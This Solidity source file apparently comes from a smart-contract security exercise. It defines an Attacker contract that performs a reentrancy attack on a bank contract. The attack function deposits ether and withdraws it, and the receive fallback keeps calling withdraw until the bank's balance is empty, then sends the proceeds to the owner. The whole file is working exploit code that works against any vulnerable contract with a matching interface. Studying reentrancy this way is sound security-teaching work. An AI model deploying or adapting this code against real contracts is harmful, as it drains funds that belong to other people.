// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;



/// @dev I would be using this interface to ineract with 
interface IBank {
  function deposit() external payable;
  function withdraw() external;
}

/// @author developeruche
contract Attacker {
  /// @dev the bank contracts interface is immplimented here
  IBank public immutable bankContract;
  address public owner;

  constructor(address bankContractAddress) {
    bankContract = IBank(bankContractAddress);
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "only owner can call this function");
    _;
  }

  /// @dev this is the start of the attack
  function attack() external payable onlyOwner {
    bankContract.deposit{ value: msg.value }();
    bankContract.withdraw();
  }

  /// @dev this is the base in how the attack continues
  receive() external payable {
    if (address(bankContract).balance > 0) {
      bankContract.withdraw();
    } else {
      payable(owner).transfer(address(this).balance);
    }
  }

  function getContractBalance() public view returns(uint ) {
      return address(this).balance;
  }
}